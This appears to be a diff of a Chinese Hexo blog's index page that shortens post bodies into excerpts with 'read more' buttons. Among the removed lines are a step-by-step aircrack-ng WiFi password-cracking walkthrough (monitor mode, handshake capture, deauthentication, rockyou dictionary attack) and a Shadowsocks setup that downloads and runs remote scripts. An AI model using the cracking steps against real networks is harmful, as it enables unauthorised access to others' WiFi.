@@ -413,10 +413,15 @@
       
         
           
-            <p>环境：kali系统+无线网卡(vm虚拟机能识别到)<br>这种攻击需要字典文件，一个好的字典至关重要。<br>我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz<br>使用前先解压：<br>gzip -d /usr/share/wordlists/rockyou.txt.gz<br>1）首先断开连接的wifi<br>   airmon-ng<br>2）开启无线网卡的监控模式<br>   airmon-ng start wlan0<br>   执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看<br>3）查看wifi网络<br>   airodump-ng wlan0mon<br>   上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID<br>   按Ctrl-C结束<br>4）抓取握手包<br>   airodump-ng -c 6 –bssid [wifimac地址BSSID] -w ~/ wlan0mon<br>   （注：-c指定频道号 –bssid指定路由器bssid -w指定抓取的数据包保存位置）<br>5）强制连接到wifi的设备重新连接路由器<br>   aireplay-ng -0 2 -a [wifimac地址BSSID] -c [STATION就是连接设备的MAC地址] wlan0mon<br>  （注：若出现<br>   Couldn’t determine current channel for wlan0mon, you should either force the operation with –   ignore-negative-one or apply a kernel patch<br>   Please specify an ESSID (-e).<br>   情况，则ifconfig wlan0 down再试上条命令）<br>   airmon-ng stop wlan0mon</p>
-<p>6) 开始破解密码<br>  aircrack-ng -a2 -b [WPA handshake] -w /usr/share/wordlists/rockyou.txt ~/*.cap<br> （注：-a2代表WPA的握手包 -b指定要破解的wifi BSSID。 -w指定字典文件 最后是抓取的包）</p>
-
-          
+          环境：kali系统+无线网卡(vm虚拟机能识别到)这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz使用前先解压：gzip -d /usr/share/wordlists/ro
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/15/kali破解wifi密码/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -556,8 +561,15 @@
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/15/vue全家桶/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -701,9 +713,15 @@
       
         
           
-            <p>之前买了搬瓦工国外vps,下面分享搭建ss的姿势！！上高铁！！<br>系统：Centos 6 x86 bbr<br>1.安装ss:<br>wget –no-check-certificate -O shadowsocks-all.sh <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</a> &amp;&amp; chmod +x shadowsocks-all.sh &amp;&amp; ./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log<br>2.选择4(shadowsocks-libev)<br>3.设置密码&amp;&amp;确认密码<br>4.输入端口<br>5.选择加密方式（我选了aes-256-gcm）<br>6.最后显示enjoy it即成功<br>7.接下来是安装加速器，从汽车到高铁的改变<br>8.参照一篇大佬的bolg：<br><a href="https://www.moerats.com/archives/387/" target="_blank" rel="noopener">https://www.moerats.com/archives/387/</a><br>9.安装命令<br>wget -N –no-check-certificate “<a href="https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;" target="_blank" rel="noopener">https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</a> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh<br>10.先安装后使用再优化(我选的是BBR，油管1080p没问题)<br>11.接下来是win系统的文件配置,在我的github下载Shadowsocks-4.0.10.zip,打开exe即可！！(服务器地址，端口，密码，加密方式，代理端口，启用系统代理，pac模式，使用本地pac)<br>下载链接:<a href="https://github.com/AmShadows/shadowsocks-windows" target="_blank" rel="noopener">https://github.com/AmShadows/shadowsocks-windows</a></p>
-
-          
+          之前买了搬瓦工国外vps,下面分享搭建ss的姿势！！上高铁！！系统：Centos 6 x86 bbr1.安装ss:wget –no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/s
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/15/番羽土啬ss/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -843,8 +861,15 @@
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/15/frp代理/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1006,8 +1031,15 @@
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/14/微信小程序-点餐系统/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1147,8 +1179,15 @@
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/05/article-title/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1329,8 +1368,15 @@
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/05/你好，hexo/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1470,17 +1516,15 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
+          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/05/hello-world/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
